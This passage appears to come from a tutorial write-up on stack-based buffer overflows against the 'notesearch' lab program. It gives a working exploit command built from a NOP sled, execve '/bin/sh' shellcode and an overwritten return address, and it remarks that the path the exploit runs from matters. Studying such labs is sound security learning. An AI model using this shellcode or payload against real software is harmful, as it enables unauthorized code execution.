+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>  env gdb notesearch
 </code></pre></div><p>The path from where you execute the exploit is also relevant. <code>./notesearch $(perl -e 'print "\x90" x 57, "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05", "\x90" x 40, "\x90\xe3\xff\xff\xff\x7f\x00\x00"')</code> didn&rsquo;t work for me, while <code>~/Desktop/overflow/notesearch $(perl -e 'print "\x90" x 57, "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05", "\x90" x 40, "\x90\xe3\xff\xff\xff\x7f\x00\x00"')</code> worked.</p>
 <figure class=centered-image><img src=/images/stack-based-buffer-overflow/notesearch-final-exploit.png>
 </figure>
